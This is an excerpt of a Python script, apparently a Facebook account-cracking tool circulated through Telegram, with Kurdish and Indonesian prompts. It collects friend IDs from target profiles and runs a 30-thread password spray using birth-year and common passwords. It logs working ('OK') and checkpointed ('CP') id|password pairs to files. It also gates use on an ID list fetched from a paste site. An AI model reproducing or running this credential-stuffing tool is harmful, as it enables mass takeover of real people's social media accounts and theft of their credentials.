...
def chk():
  ...
  try:
    httpCaht = requests.get("https://justpaste.it/4t3oa").text
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @LDVIP_GYM")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
\033[1;97m AM TOOLA UPDATE KRAWATAWA  BY @FFRFF3
...
def login_lagi():
	banner()
	sky = '\033[1;97m LERA TOKEN DANE AKSES TOKEN'
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'+'+x+'] \033[1;97m CHAN ID DA DANEY (TA 10 ATWANI)')
	try:
	...
	yz = 0
	print(x+'['+h+'+'+x+'] HAMU ID YAK TEDA KAR DAKAT')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+']\033[1;97m ID DANE '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def passwrd():
	...
	krek = 'Live LDVIP>> : OK👍/%s\n Check LDVIP> : 👎CP/%s\n'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['19971997','19981998','19961996','123456789','19951995','123456123456','19991999']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s %s/%s LDVIP> \033[1;92mOK👍:%s LDVIP> \033[1;91mCP👎:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s\033[1;97mJEWEL> %s/%s ==> \033[1;92mOK:%s ===> \033[1;91mCP:%s ===> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%sLDVIP %s|%s ----> CP       '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%sLDVIP %s|%s ----> OK       '%(h,idf,pw))
...
def crack3(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s==>> %s/%s JEWEL> \033[1;92mOK:%s ==>> \033[1;91mCP:%s ==>> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%sLDVIP %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
	...
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%sLDVIP %s ----> Error      %s'%(b,kes,x))
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%sLDVIP %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%sLDVIP %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%sLDVIP %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
